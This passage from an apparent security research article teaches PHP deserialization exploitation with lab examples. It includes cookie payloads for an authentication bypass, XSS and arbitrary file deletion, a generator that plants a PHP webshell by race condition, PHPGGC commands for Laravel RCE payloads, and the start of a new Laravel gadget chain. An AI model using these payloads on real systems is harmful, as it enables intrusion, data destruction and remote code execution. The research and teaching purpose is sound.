  ["instance"]=>
  int(2)
  }
  

#### `__debugInfo()`

Description:

> This method is called by `var_dump()` when dumping an object to get the properties that should be shown. If the method isn't defined on an object, then all `public`, `protected` and `private` properties will be shown. - [__debugInfo()](https://www.php.net/manual/en/language.oop5.magic.php#object.debuginfo)

We just have seen how almost every magic method works. Now, let's take a look at how to exploit the `unserialize()` function.

## Exploiting deserialization

### Taking advantage of the code logic

An example often used to demonstrate how an attacker can benefit from the logic of a PHP script is to bypass an authentication mechanism when that mechanism is based on the attributes of an object instantiated via user data.

File: [example_17.php](resources/2024-02-06_laravel-gadget-chain/Examples/example_17.php)
  
  
  <?php
  
  class User
  {
  
  function __construct($username, $is_admin=-1)
  {
  $this->username = $username;
  $this->is_admin = $is_admin;
  echo "Hello from function __construct()\n";
  }
  
  }
  
  $serialized_new_user_object = $_COOKIE["user"];
  $new_user_object = unserialize($serialized_new_user_object);
  
  if ($new_user_object->is_admin == -1)
  {
  echo "The user is a guest." . "\n";
  }
  elseif ($new_user_object->is_admin == 0)
  {
  echo "The user is authenticated as " . $new_user_object->username . ".\n";
  }
  elseif ($new_user_object->is_admin == 1)
  {
  echo "The user is an administrator and is authenticated as " . $new_user_object->username . ".\n";
  }
  else
  {
  exit("An unexpected error has just occurred!" . "\n");
  }
  
  ?>
  

Here's an example of request using the serialized object of a user who is a guest user.

Request (HTTP):
  
  
  GET /example_17.php HTTP/1.1
  Host: 127.0.0.1:58080
  Cookie: user=O:4:"User":2:{s:8:"username"%3bs:4:"test"%3bs:8:"is_admin"%3bi:-1%3b}
  

The value of attribute `is_admin` being `-1`, we can see below that we land in the first branch of the conditional tree (within condition `$new_user_object->is_admin == -1`).

Response (HTTP):
  
  
  HTTP/1.1 200 OK
  X-Powered-By: PHP/7.4.2
  Content-Length: 21
  Content-Type: text/html; charset=UTF-8
  
  The user is a guest.
  

By alternating the value of `is_admin` within the serialized data, the attacker can reach the different branches of the conditional tree. The objective is to take advantage of code logic to reach a desired branch. Here we replace the type of the attribute `is_admin` but also its value from `0` to `0e1` as we take advantage of the [loose comparison](https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf) (`==` and not `===`).

Request (HTTP):
  
  
  GET /example_17.php HTTP/1.1
  Host: 127.0.0.1:58080
  Cookie: user=O:4:"User":2:{s:8:"username"%3bs:4:"test"%3bs:8:"is_admin"%3bs:3:"Oe1"%3b}
  

Response (HTTP):
  
  
  HTTP/1.1 200 OK
  X-Powered-By: PHP/7.4.2
  Content-Length: 35
  Content-Type: text/html; charset=UTF-8
  
  The user is authenticated as test.
  

However, an attacker can also reach the branch intended for administrators using this payload:
  
  
  O:4:"User":2:{s:8:"username"%3bs:4:"test"%3bs:8:"is_admin"%3bi:1%3b}
  

Or a branch not foreseen by the developers using:
  
  
  O:4:"User":2:{s:8:"username"%3bs:4:"test"%3bs:8:"is_admin"%3bi:1337%3b}
  

Now that we've seen how to take advantage of the script logic, let's take a look at how to take advantage of magic methods.

### Taking advantage of magic methods

This part is important to us as it's the one which is most closely related to the search of generic gadget chain. As an attacker, we identify our entry point as a call to the function `unserialize()` where we control its first argument via the cookie header (`base64_decode($_COOKIE["user"])`). Once we've crafted our serialized string, we'll need to encode it in base64 using the PHP function `base64_encode()` before sending it to our fictional target. As already explained, the function `__construct()` is not called during deserialization, consequently, we are only interested in the following methods for the example below:

  * `__toString()`
  * `__destruct()`
  * `__wakeup()`

File: [example_18.php](resources/2024-02-06_laravel-gadget-chain/Examples/example_18.php)
  
  
  <?php
  
  class User
  {
  public $username;
  protected $authenticated = False;
  protected $logfile;
  
  function __construct($username)
  {
  $this->username = $username;
  $this->logfile = "/tmp/logs/user_". md5(random_bytes(20));
  
  $ufp = fopen($this->logfile, "a");
  $message = "[*] User (" . $this->username . ") created.\n";
  fwrite($ufp, $message);
  fclose($ufp);
  }
  
  function check_authentication()
  {
  // TODO
  }
  
  function get_authentication_status()
  {
  if ($this->authenticated)
  return "ok";
  return "ko";
  }
  
  function __wakeup()
  {
  $ufp = fopen($this->logfile, "a");
  $message = "[*] User (" . $this->username . "), authentication status: " . $this->get_authentication_status() . "\n";
  fwrite($ufp, $message);
  fclose($ufp);
  }
  
  function __toString()
  {
  return $this->username;
  }
  
  function __destruct()
  {
  unlink($this->logfile);
  }
  }
  
  $u = unserialize(base64_decode($_COOKIE["user"]));
  if ($u == false)
  {
  $u = new User("test_0");
  }
  
  sleep(2);
  
  echo "Hello " . $u;
  
  sleep(2);
  
  ?>
  

By referring to the description of the magic methods and their examples, you'll see that the above code can be used to exploit the following vulnerabilities:

  * Reflected self XSS via user cookies
  * Arbitrary file deletion
  * Partial arbitrary file write to remote code execution

#### Reflected self XSS via user cookies

When executing the following line of code:
  
  
  ...
  
  echo "Hello " . $u;
  
  ...
  

The function `__toString()` is called and consequently reflects in the server response the attribute `username` from class `User`, controlled by the attacker via the deserialization.

Let's take the following payload:
  
  
  O:4:"User":1:{s:8:"username";s:4:"test";}
  

Encode it to base64:
  
  
  Tzo0OiJVc2VyIjoxOntzOjg6InVzZXJuYW1lIjtzOjQ6InRlc3QiO30=
  

And use it within our cookies.

Request (HTTP):
  
  
  GET /example_18.php HTTP/1.1
  Host: 127.0.0.1:58080
  Cookie: user=Tzo0OiJVc2VyIjoxOntzOjg6InVzZXJuYW1lIjtzOjQ6InRlc3QiO30=
  

Response (HTTP):
  
  
  HTTP/1.1 200 OK
  X-Powered-By: PHP/7.4.2
  Content-Length: 1070
  Content-Type: text/html; charset=UTF-8
  
  ...
  
  Hello test
  
  ...
  

Now, if we update our payload to include an XSS trigger, it looks like this:
  
  
  O:4:"User":1:{s:8:"username";s:28:"<img/src=x onerror=alert(1)>";}
  

Encode it to base64:
  
  
  Tzo0OiJVc2VyIjoxOntzOjg6InVzZXJuYW1lIjtzOjI4OiI8aW1nL3NyYz14IG9uZXJyb3I9YWxlcnQoMSk+Ijt9
  

Reinsert it into our cookies.

Request (HTTP):
  
  
  GET /example_18.php HTTP/1.1
  Host: 127.0.0.1:58080
  Cookie: user=Tzo0OiJVc2VyIjoxOntzOjg6InVzZXJuYW1lIjtzOjI4OiI8aW1nL3NyYz14IG9uZXJyb3I9YWxlcnQoMSk+Ijt9
  

Response (HTTP):
  
  
  HTTP/1.1 200 OK
  X-Powered-By: PHP/7.4.2
  Content-Length: 1094
  Content-Type: text/html; charset=UTF-8
  
  ...
  
  Hello <img/src=x onerror=alert(1)><br />
  
  ...
  

The problem with gadget chains linked to function `__toString` is that we have no control over when the function is called, because, the object must be converted or used as a string. At least that's what we thought before discovering the trick we'll present later.

#### Arbitrary file deletion

As seen above, the function `User::__destruct()` is called at the end of the script. In some cases, such as creating a gadget chain, we don't want the remaining code of the script to alter the newly instantiated object, so we want to trigger the execution of function `__destruct()` during the deserialization just after the object creation. To achieve this, we will use the fast destruct technique evoked earlier.

The function `__destruct()` is triggered when there is no longer any reference to the related object. However, it is possible to delete all references to this object during the deserialization process and we'll see how. Let's deviate a little from the current example and let's have a look at the one below.

File: [example_19.php](resources/2024-02-06_laravel-gadget-chain/Examples/example_19.php)
  
  
  <?php
  
  class Junk
  {
  public $value = 1337;
  
  function __construct($value)
  {
  $this->value = $value;
  }
  
  function __destruct()
  {
  echo "Hello from function __destruct(), value = $this->value\n";
  }
  }
  
  $u = unserialize(base64_decode($_COOKIE["junk"]));
  if ($u == false)
  {
  $u = new Junk(1338);
  }
  
  sleep(2);
  
  echo "Coucou, I appear after the first sleep\n";
  
  sleep(2);
  
  echo "Coucou, I appear after the second sleep\n";
  
  ?>
  

Let's execute the script in the simplest possible way.

Request (HTTP):
  
  
  GET /example_19.php HTTP/1.1
  Host: 127.0.0.1:58080
  

Response (HTTP):
  
  
  HTTP/1.1 200 OK
  X-Powered-By: PHP/7.4.2
  Content-Length: 126
  Content-Type: text/html; charset=UTF-8
  
  Coucou, I appear after the first sleep
  Coucou, I appear after the second sleep
  Hello from function __destruct(), value = 1338
  

Now let's take advantage of the possibility of controlling the first parameter of the function `unserialize()` to instantiate a `Junk` object and set its attribute `value` to `1339`.

Let's take the following payload:
  
  
  O:4:"Junk":1:{s:5:"value";i:1339;}
  

Encode it to base64:
  
  
  Tzo0OiJKdW5rIjoxOntzOjU6InZhbHVlIjtpOjEzMzk7fQ==
  

Use it.

Request (HTTP):
  
  
  GET /example_19.php HTTP/1.1
  Host: 127.0.0.1:58080
  Cookie: junk=Tzo0OiJKdW5rIjoxOntzOjU6InZhbHVlIjtpOjEzMzk7fQ==
  

Response (HTTP):
  
  
  HTTP/1.1 200 OK
  X-Powered-By: PHP/7.4.2
  Content-Length: 126
  Content-Type: text/html; charset=UTF-8
  
  Coucou, I appear after the first sleep
  Coucou, I appear after the second sleep
  Hello from function __destruct(), value = 1339
  

So now, instead of serializing the `Junk` object directly, let's place it in the first position of a two-elements array which once serialized, gives us the following payload:
  
  
  a:2:{i:0;O:4:"Junk":1:{s:5:"value";i:1339;}i:1;s:14:"useless string";}
  

During deserialization, the PHP interpreter will first creates an `array` of 2 elements (`a:2:`), continue the deserialization process to instantiate our `Junk` object as the first element of the array (`i:0;O:4:"Junk":1:`), and then instantiate a string as the second element (`i:1;s:14:`). Now what happens? If you replace:
  
  
  ... i:1;s:14: ...
  

By:
  
  
  ... i:0;s:14: ...
  

During deserialization, the PHP interpreter will first create an `array` of 2 elements (`a:2:`), continue the deserialization process to instantiate our `Junk` object as the first element of the array (`i:0;O:4:"Junk":1:`), and then instantiate a string as the first element (`i:0;s:14:`) because `i` is defined as `0`. The array of size two now contains a string as its first element and `NULL` as its second element. As a result, there is no longer any reference to our instantiated `Junk` object, which, as we have seen, triggers function `__destruct()`.

Let's take the following payload:
  
  
  a:2:{i:0;O:4:"Junk":1:{s:5:"value";i:1339;}i:0;s:14:"useless string";}
  

Encode it to base64:
  
  
  YToyOntpOjA7Tzo0OiJKdW5rIjoxOntzOjU6InZhbHVlIjtpOjEzMzk7fWk6MDtzOjE0OiJ1c2VsZXNzIHN0cmluZyI7fQ==
  

Use it.

Request (HTTP):
  
  
  GET /example_19.php HTTP/1.1
  Host: 127.0.0.1:58080
  Cookie: junk=YToyOntpOjA7Tzo0OiJKdW5rIjoxOntzOjU6InZhbHVlIjtpOjEzMzk7fWk6MDtzOjE0OiJ1c2VsZXNzIHN0cmluZyI7fQ==
  

Response (HTTP):
  
  
  HTTP/1.1 200 OK
  X-Powered-By: PHP/7.4.2
  Content-Length: 126
  Content-Type: text/html; charset=UTF-8
  
  Hello from function __destruct(), value = 1339
  Coucou, I appear after the first sleep
  Coucou, I appear after the second sleep
  

This fast destruct mechanism is the reason why most gadget chains start with a call to an object's `__destruct()` method. Controlling when a function is executed is essential to prevent the rest of a PHP script from modifying the object we've managed to instantiate thanks to deserialization. We can now return to the previous example ([example_18.php](resources/2024-02-06_laravel-gadget-chain/Examples/example_18.php)).

File: [example_18.php](resources/2024-02-06_laravel-gadget-chain/Examples/example_18.php)
  
  
  ...
  
  class User
  {
  
  ...
  
  function __destruct()
  {
  unlink($this->logfile);
  }
  }
  
  ...
  

> `unlink(string $filename, ?resource $context = null): bool`
> 
> Deletes `filename`. Similar to the Unix C `unlink()` function. An `E_WARNING` level error will be generated on failure.

By controlling the attribute `logfile` of the class `User`, we can delete an arbitrary file on the filesystem (as long as the PHP process have sufficient rights). With all the information we've seen so far, we're able to put together a first gadget chain:

File: [gen_0.php](resources/2024-02-06_laravel-gadget-chain/Examples/gen_0.php)
  
  
  <?php
  
  class User
  {
  protected $logfile;
  
  function __construct()
  {
  $this->logfile = "/var/www/html/dummy_file";
  }
  }
  
  $u = new User();
  $a = array(0=>$u, "useless string");
  $so = serialize($a);
  $so = str_replace('i:1;s:14:"useless string";', 'i:0;s:14:"useless string";', $so); # Using the fast destruct technique
  $bso = base64_encode($so);
  echo $bso . "\n";
  
  ?>
  

Once executed, the above script gives us the following result:
  
  
  YToyOntpOjA7Tzo0OiJVc2VyIjoxOntzOjEwOiIAKgBsb2dmaWxlIjtzOjI0OiIvdmFyL3d3dy9odG1sL2R1bW15X2ZpbGUiO31pOjA7czoxNDoidXNlbGVzcyBzdHJpbmciO30=
  

It is always preferable to be able to encode our gadgets chain in base64 because objects's properties and methods can have access modifiers which control from where they can be accessed (`public`, `protected`, `private`). During serialization, these access modifiers affect the format of the serialized data and adds null bytes to our serialized string.
  
  
  $ echo -ne "YToyOn...JpbmciO30="|base64 -d|hexdump -C
  00000000  61 3a 32 3a 7b 69 3a 30  3b 4f 3a 34 3a 22 55 73  |a:2:{i:0;O:4:"Us|
  00000010  65 72 22 3a 31 3a 7b 73  3a 31 30 3a 22 00 2a 00  |er":1:{s:10:".*.|
  00000020  6c 6f 67 66 69 6c 65 22  3b 73 3a 32 34 3a 22 2f  |logfile";s:24:"/|
  00000030  76 61 72 2f 77 77 77 2f  68 74 6d 6c 2f 64 75 6d  |var/www/html/dum|
  00000040  6d 79 5f 66 69 6c 65 22  3b 7d 69 3a 30 3b 73 3a  |my_file";}i:0;s:|
  00000050  31 34 3a 22 75 73 65 6c  65 73 73 20 73 74 72 69  |14:"useless stri|
  00000060  6e 67 22 3b 7d  |ng";}|
  00000065
  

From PHP 5 to 7, it was necessary to take this into consideration when building gadget chain:

> Consider the following class: 
>  
>  
>  class Test {
>  public $public = 1;
>  protected $protected = 2;
>  private $private = 3;
>  }
>  
> 
> This is serialized as follows: 
>  
>  
>  v-- strlen("Test")  v-- property  v-- value
>  O:4:"Test":3:{s:6:"public";i:1;s:12:"\0*\0protected";i:2;s:13:"\0Test\0private";i:3;}
>  ^-- property ^-- value  ^-- property  ^-- value
>  

> The `\0` in the above serialization string are NULL bytes. As you can see private and protected members are serialized with rather peculiar names: Private properties are prefixed with `\0ClassName\0` and protected properties with `\0*\0`.

From a practical point of view, with recent PHP versions (since PHP 8), it is no longer necessary to specify access modifiers during gadget chain creation, and it is therefore possible to avoid this problem. However, you should always bear in mind that older versions of PHP will still have this problem (especially when you're in a "black box" type of engagement and can't fingerprint your target PHP version), which is why it's mandatory to define access modifiers when adding a gadget chain to [PHPGGC](https://github.com/ambionics/phpggc).

Let's check that the file dummy_file exists.

Request (HTTP):
  
  
  GET /dummy_file HTTP/1.1
  Host: 127.0.0.1:58080
  

Response (HTTP):
  
  
  HTTP/1.1 200 OK
  Content-Length: 60
  
  <html>
  <body>
  <p>Coucou</p>
  </body>
  </html>
  

Then use our chain gadget to delete it:

Request (HTTP):
  
  
  GET /example_18.php HTTP/1.1
  Host: 127.0.0.1:58080
  Cookie: user=YToyOntpOjA7Tzo0OiJVc2VyIjoxOntzOjEwOiIAKgBsb2dmaWxlIjtzOjI0OiIvdmFyL3d3dy9odG1sL2R1bW15X2ZpbGUiO31pOjA7czoxNDoidXNlbGVzcyBzdHJpbmciO30=
  

Response (HTTP):
  
  
  HTTP/1.1 200 OK
  X-Powered-By: PHP/7.4.2
  Content-Length: 11
  Content-Type: text/html; charset=UTF-8
  
  Hello Array
  

Let's try again to retrieve the file dummy_file:

Request (HTTP):
  
  
  GET /dummy_file HTTP/1.1
  Host: 127.0.0.1:58080
  

Response (HTTP):
  
  
  HTTP/1.1 404 Not Found
  Content-Length: 274
  Content-Type: text/html; charset=iso-8859-1
  
  <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
  <html><head>
  <title>404 Not Found</title>
  </head><body>
  <h1>Not Found</h1>
  <p>The requested URL was not found on this server.</p>
  <hr>
  <address>Apache/2.4.38 (Debian) Server at 127.0.0.1 Port 58080</address>
  </body></html>
  

The file dummy_file has been successfully deleted.

In itself, arbitrary file deletion is not something we would use, but some CMS (Content Management System) rely on the existence of specific files to block functionality related to the reinstallation or installation of a CMS. Deleting these files would reactivate these features and often allow us to take control of the server (Reinstall the CMS -> Access administration interface -> Add plugin -> Execute code).

Let's take a look at the last vulnerability, partial writing of arbitrary files.

#### Partial arbitrary file write

As we described earlier, the function `__wakeup()` is called during the deserialization process and is therefore a very good candidate for starting a gadget chain.

File: [example_18.php](resources/2024-02-06_laravel-gadget-chain/Examples/example_18.php)
  
  
  ...
  
  class User
  {
  
  ...
  
  function __wakeup()
  {
  $ufp = fopen($this->logfile, "a");
  $message = "[*] User (" . $this->username . "), authentication status: " . $this->get_authentication_status() . "\n";
  fwrite($ufp, $message);
  fclose($ufp);
  }
  
  ...
  
  function __destruct()
  {
  unlink($this->logfile);
  }
  }
  
  ...
  

When we look at the use of attributes, it's easy to see that we're able to arbitrarily create a file (via attribute `logfile`) and control part of its contents (via attribute `username`), which allow us to write a Webshell to the location we want. One difficulty that could have been encountered is that at the end of script, the function `__destruct()` is executed, so the Webshell is deleted. To make comprehension easy for beginners, the example calls the `sleep()` function several times to simplify exploitation. If this wasn't the case, it would have been possible to exploit the vulnerability by combining the deserialization vulnerability with a race condition attack. In any case, it is obvious that in this situation we do not want to take advantage of the fast destruct technique as we want our Webshell to be present on the filesystem as long as possible in order to make the time window necessary to the exploitation as large as possible.

File: [gen_1.php](resources/2024-02-06_laravel-gadget-chain/Examples/gen_1.php)
  
  
  <?php
  
  class User
  {
  public $username;
  protected $logfile;
  
  function __construct()
  {
  $this->username = "<?php system('id') ?>";
  $this->logfile = "/var/www/html/webshell.php";
  }
  }
  
  $u = new User();
  $so = serialize($u);
  $bso = base64_encode($so);
  echo $bso . "\n";
  
  ?>
  

To generate the new gadget chain, simply execute the file gen_1.php.
  
  
  Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjIxOiI8P3BocCBzeXN0ZW0oJ2lkJykgPz4iO3M6MTA6IgAqAGxvZ2ZpbGUiO3M6MjY6***REDACTED-SUSPECT-TOKEN***First, let's check that file /var/www/html/webshell.php doesn't exist:

Request (HTTP):
  
  
  GET /webshell.php HTTP/1.1
  Host: 127.0.0.1:58080
  

Response (HTTP):
  
  
  HTTP/1.1 404 Not Found
  Content-Length: 274
  Content-Type: text/html; charset=iso-8859-1
  
  <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
  <html><head>
  <title>404 Not Found</title>
  </head><body>
  <h1>Not Found</h1>
  <p>The requested URL was not found on this server.</p>
  <hr>
  <address>Apache/2.4.38 (Debian) Server at 127.0.0.1 Port 58080</address>
  </body></html>
  

Now, we can exploit the vulnerability by executing two HTTP requests simultaneously (some kind of race condition):

Request 1 (HTTP):
  
  
  GET /example_18.php HTTP/1.1
  Host: 127.0.0.1:58080
  Cookie: user=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjIxOiI8P3BocCBzeXN0ZW0oJ2lkJykgPz4iO3M6MTA6IgAqAGxvZ2ZpbGUiO3M6MjY6***REDACTED-SUSPECT-TOKEN***Request 2 (HTTP):
  
  
  GET /webshell.php HTTP/1.1
  Host: 127.0.0.1:58080
  

> The response to request 2 arrives before the response to request 1.

Response 2 (HTTP):
  
  
  HTTP/1.1 200 OK
  X-Powered-By: PHP/7.4.2
  Content-Type: text/html; charset=UTF-8
  Content-Length: 93
  
  [*] User (uid=33(www-data) gid=33(www-data) groups=33(www-data)
  ), authentication status: ko
  

Response 1 (HTTP):
  
  
  HTTP/1.1 200 OK
  Date: Wed, 31 Jan 2024 17:26:07 GMT
  Server: Apache/2.4.38 (Debian)
  X-Powered-By: PHP/7.4.2
  Content-Length: 27
  Content-Type: text/html; charset=UTF-8
  
  Hello <?php system('id') ?>
  

All that remains is to check that the object destructor has been executed at the end of the script example_18.php and therefore our Webshell has been correctly deleted.

Request (HTTP):
  
  
  GET /webshell.php HTTP/1.1
  Host: 127.0.0.1:58080
  

Response (HTTP):
  
  
  HTTP/1.1 404 Not Found
  Content-Length: 274
  Content-Type: text/html; charset=iso-8859-1
  
  <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
  <html><head>
  <title>404 Not Found</title>
  </head><body>
  <h1>Not Found</h1>
  <p>The requested URL was not found on this server.</p>
  <hr>
  <address>Apache/2.4.38 (Debian) Server at 127.0.0.1 Port 58080</address>
  </body></html>
  

With all these information at your disposal, it's now up to you to exploit the `uneserialize()` function and identify trivial gadget chains.

## In what context are gadget chains useful?

Developers use frameworks and libraries in PHP as they provide a structured and efficient way to build Web applications. Code organization and structure, rapid development, security features, abstraction and simplification, community and ecosystem, are reasons why they are so widely used.

In the context of security research and penetration testing, seeking gadget chain within libraries and frameworks (such as those integrated into PHPGGC) can be useful for several reasons. Understanding an attack surface, increasing the impact of the deserialization vulnerability if the affected library or framework is widely used (the number of projects using the affected library or framework can be considerable). In short, the impact of this kind of gadget chain extends beyond the boundaries of an individual application.

Popular PHP frameworks like Laravel, Symfony or CodeIgniter and libraries like Monolog, Guzzle, Doctrine are referenced in PHPGGC for containing gadget chains.

### What is PHPGGC?

[PHPGGC](https://github.com/ambionics/phpggc) (PHP Generic Gadget Chains) is a tool designed by [Charles Fol](https://twitter.com/cfreal_) to automate the process of generating serialized payloads for leveraging PHP object injection vulnerabilities. The tool comes with a collection of gadget chains for different framework and libraries.

#### Installing PHPGGC

Ensure PHPGGC is installed on your system or fetch the latest version from the GitHub [repository](https://github.com/ambionics/phpggc):
  
  
  git clone https://github.com/ambionics/phpggc
  cd phpggc
  

#### Listing available gadgets

Run the following command to list available gadgets:
  
  
  ./phpggc -l
  

Then, review the list of gadget chains, considering the context of the target application to select an appropriate chain for exploitation.

#### Selecting a gadget chain or test them all

Choose a gadget chain that is suitable for the target application's context. Consider factors like the PHP version, libraries in use and the desired payload.
  
  
  ./phpggc -l laravel
  
  Gadget Chains
  -------------
  
  NAME  VERSION  TYPE  VECTOR  I
  
  ...
  
  Laravel/RCE20  5.6 <= 10.x  RCE: Command  __destruct
  

Then generate the serialized data.
  
  
  ./phpggc -f -b Laravel/RCE20 system id
  

In the case of a black box pentest, we recommend to test them all in order to maximize the chances for the exploit to succeed.

### How to identify a new gadget chain?

It may seem basic but after reading this article you should be able to understand what a gadget chain is. Gadget chain in the context of PHP security refers to sequences of classes and methods that, when executed during the deserialization process, lead to unintended consequences (like remote code execution). Understanding this very concept is crucial for recognizing and crafting effective exploits.

Explore PHP frameworks and libraries and keep up to date with what's new. Understand their architecture, components, and data handling mechanisms. Analyze their documentation and release notes for security-related updates. Search public repositories (e.g., GitHub) and exploit databases for existing gadget chains related to a targeted framework or library. Analyze proof of concept code and understand how different gadget chains operate by analyzing the relationships between classes and methods during the deserialization flow. Think of it as a puzzle, where most of the time you'll have to start with pieces `__wakeup()` or `__destruct()`, but don't just grep for these functions either.

Before presenting the two tricks mentioned in the introduction, we'd like to make a few concluding remarks.

Identifying new gadget chains in PHP frameworks and libraries involves a comprehensive approach, including understanding the concept of gadget chains, exploring target frameworks and libraries, researching existing chains, creating custom ones through reverse engineering and code auditing. Continuous engagement with the security community and staying informed about updates are essential components of an effective research process.

## And Laravel in all this?

During an engagement we had the opportunity to identify a new gadget chain within [Laravel](https://laravel.com/). The target configuration was as follows:

  * Target: Laravel (in debug mode)
  * Version: [5.7.15](https://github.com/laravel/laravel/archive/refs/tags/v5.7.15.zip)

### Context

When we made an HTTP POST request to the target /index.php, the server responded with a status code `405` (Method Not Allowed) and as Laravel was configured in [debug mode](https://laravel.com/docs/10.x/configuration#debug-mode), it returned the environment variables linked to the PHP process within the debug page content.

![alt-text](resources/2024-02-06_laravel-gadget-chain/Captures/c7.png)

![alt-text](resources/2024-02-06_laravel-gadget-chain/Captures/c8.png)

The `APP_KEY` environment variable is used to decrypt and encrypt cookies within the Laravel framework. You can refer to [Timo Muller](https://mogwailabs.de/en/blog/2022/08/exploiting-laravel-based-applications-with-leaked-app_keys-and-queues/)'s work if you want to understand how it works. After reading his article we understood that without authentication, we could control the first parameter of the PHP `unserialize()` function via cookie deserialization (once they have been deciphered by the Web server).

We then set up our lab to reproduce the target's environment.

### Setup the lab for Laravel

We used `docker ps` to find out which container corresponded to our Web server.
  
  
  docker ps
  CONTAINER ID  IMAGE  COMMAND  CREATED  STATUS  PORTS  NAMES
  af863794da1b  phpmyadmin  "/docker-entrypoint.…"  24 hours ago  Up 24 hours  0.0.0.0:8284->80/tcp, :::8284->80/tcp, 0.0.0.0:8285->443/tcp, :::8285->443/tcp  lamp-phpmyadmin
  8f6bd9c8c023  lamp_webserver  "docker-php-entrypoi…"  24 hours ago  Up 24 hours  0.0.0.0:8282->80/tcp, :::8282->80/tcp, 0.0.0.0:8283->443/tcp, :::8283->443/tcp, 0.0.0.0:8383->8000/tcp, :::8383->8000/tcp  lamp-php74
  4550cbf11682  lamp_database  "docker-entrypoint.s…"  24 hours ago  Up 24 hours  127.0.0.1:3306->3306/tcp, 33060/tcp  lamp-mysql8
  

And placed ourselves in our container by executing the command:
  
  
  docker exec -it lamp-php74 bash
  

We ended up in the folder /var/www/html.

Once at the server root within the docker container, we installed `composer` via the following commands:
  
  
  php -r "copy('https://getcomposer.org/installer', 'composer-setup.php');"
  php -r "if (hash_file('sha384', 'composer-setup.php') === 'e21205b207c3ff031906575712edab6f13eb0b361f2085f1f1237b7126d785e826a450292b6cfd1d64d92e6563bbde02') { echo 'Installer verified'; } else { echo 'Installer corrupt'; unlink('composer-setup.php'); } echo PHP_EOL;"
  php composer-setup.php
  php -r "unlink('composer-setup.php');"
  

We then downloaded the version of Laravel we were interested in:
  
  
  wget https://github.com/laravel/laravel/archive/refs/tags/v5.7.15.zip
  

Decompressed the archive with:
  
  
  unzip v5.7.15.zip 
  

And went to the folder laravel-5.7.15:
  
  
  cd laravel-5.7.15/
  

We installed Laravel by running the command:
  
  
  php ../composer.phar install --ignore-platform-req=php
  

Copied file .env.example to .env, executed the command `php artisan key:generate` (to generate a new `APP_KEY`), then within the file .env, replaced line:

File: .env
  
  
  ...
  
  SESSION_DRIVER=file
  
  ...
  

By

File: .env
  
  
  ...
  
  SESSION_DRIVER=cookie
  
  ...
  

We then started the Web server as follows:
  
  
  php artisan serve --host 0.0.0.0 --port 8000
  

> Note that port 58000 on the host is mapped to port 8000 on the container.

The chain we've identified uses the objects:

  * `Illuminate\Routing\PendingResourceRegistration` (serves as a proxy to reach `Illuminate\Validation\Rules\RequiredIf::__toString()`)
  * `Illuminate\Routing\ResourceRegistrar` (used to trigger `Illuminate\Routing\ResourceRegistrar::register()`)
  * `Illuminate\Validation\Rules\RequiredIf` (serves as a proxy to reach `call_user_func()` whose first argument is controlled)
  * `Illuminate\Auth\RequestGuard` (final call to `call_user_func()` whose all arguments are controlled)

Let's take a look at what's happening in the chain.

### Trick 1: Use a class destructor as a proxy to trigger another magic method

As we explained earlier, most gadget chains start with a call to method `__destruct()`, precisely because it's possible to control when this function is triggered using the fast destruct technique. However, as you'll notice in your research, it's not common to obtain direct code execution when calling this method. This method acts more as a trigger for the rest of the chain. Our advice is therefore as follows:

  * Use `__destruct()` as a proxy for another magic method (for example `__toString()`)

When an object is destroyed, its magic method `__destruct()` is called as we saw before.

File: src/Illuminate/Routing/PendingResourceRegistration.php  
Class: `PendingResourceRegistration`  
Functions: `__destruct()`, `register()`
  
  
  <?php
  
  namespace Illuminate\Routing;
  
  use Illuminate\Support\Traits\Macroable;
  
  class PendingResourceRegistration
  {
  use Macroable;
  
  ...
  
  /**
  * Register the resource route.
  *
  * @return \Illuminate\Routing\RouteCollection
  */
  public function register()
  {
  $this->registered = true;
  
  return $this->registrar->register(
  $this->name, $this->controller, $this->options
  );
  }
  
  /**
  * Handle the object's destruction.
  *
  * @return void
  */
  public function __destruct()
  {
  if (! $this->registered) {
  $this->register();
  }
  }
  

We can see that `$this->registrar` must at least be defined and be an instance of class `ResourceRegistrar` in order to call function `register()`. Moreover, it is clear that we control all the parameters of the function `register()` ( `$this->name`, `$this->controller`, `$this->options`).

File: src/Illuminate/Routing/ResourceRegistrar.php  
Class: `ResourceRegistrar`  
Function: `register()`
  
  
  <?php
  
  namespace Illuminate\Routing;
  
  use Illuminate\Support\Str;
  
  class ResourceRegistrar
  {
  
  ...
  
  /**
  * Route a resource to a controller.
  *
  * @param  string  $name
  * @param  string  $controller
  * @param  array  $options
  * @return \Illuminate\Routing\RouteCollection
  */
  public function register($name, $controller, array $options = [])
  {
  
  ...
  
  if (Str::contains($name, '/')) {
  $this->prefixedResource($name, $controller, $options);
  
  return;
  }
  
  ...
  
  }
  
  ...
  

Function `ResourceRegistrar::register()` call `Str::contains()` which triggers function `__toString()` from `$name` wich we define as an `Illuminate\Validation\Rules\RequiredIf` object.

File: src/Illuminate/Validation/Rules/RequiredIf.php  
Class: `PendingResourceRegistration`  
Function: `__toString()`
  
  
  <?php
  
  namespace Illuminate\Validation\Rules;
  
  class RequiredIf
  {
  
  ...
  
  /**
  * Convert the rule to a validation string.
  *
  * @return string
  */
  public function __toString()
  {
  if (is_callable($this->condition)) {
  return call_user_func($this->condition) ? 'required' : '';
  }
  
  return $this->condition ? 'required' : '';
  }
  }
  

### Trick 2: Call call_user_func() with an array as first parameter

When we look at the function [`call_user_func()`](https://www.php.net/manual/en/language.oop5.magic.php), we realize that we can pass it an array as first parameter as shown in the example below.

> call_user_func - Call the callback given by the first parameter
> 
> `call_user_func(callable $callback, mixed ...$args): mixed`

File: [Example #4 Using a class method with call_user_func()](https://www.php.net/manual/en/function.call-user-func#refsect1-function.call-user-func-examples)
  
  
  <?php
  
  class myclass {
  static function say_hello()
  {
  echo "Hello!\n";
  }
  }
  
  $classname = "myclass";
  
  call_user_func(array($classname, 'say_hello'));
  call_user_func($classname .'::say_hello');
  
  $myobject = new myclass();
  
  call_user_func(array($myobject, 'say_hello'));
  
  ?>
  

So we started looking for an object which, when we call one of its methods without parameters, allows us to execute code.

File: src/Illuminate/Auth/RequestGuard.php  
Class: `RequestGuard`  
Function: `user()`
  
  
  <?php
  
  namespace Illuminate\Auth;
  
  use Illuminate\Http\Request;
